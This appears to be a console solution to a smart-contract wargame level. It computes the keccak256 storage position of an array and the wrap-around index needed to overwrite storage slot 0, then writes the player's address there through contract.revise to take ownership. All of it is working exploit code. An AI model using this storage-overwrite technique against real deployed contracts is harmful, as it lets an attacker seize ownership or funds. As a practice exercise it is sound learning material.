//in console

// Position
p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))

// Output: 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6

i = BigInt(2 ** 256) - BigInt(p)

// Output: 35707666377435648211887908874984608119992236509074197713628505308453184860938n

content = '0x' + '0'.repeat(24) + player.slice(2)

// Output: '0x000000000000000000000000<20-byte-player-address>'

await contract.revise(i, content)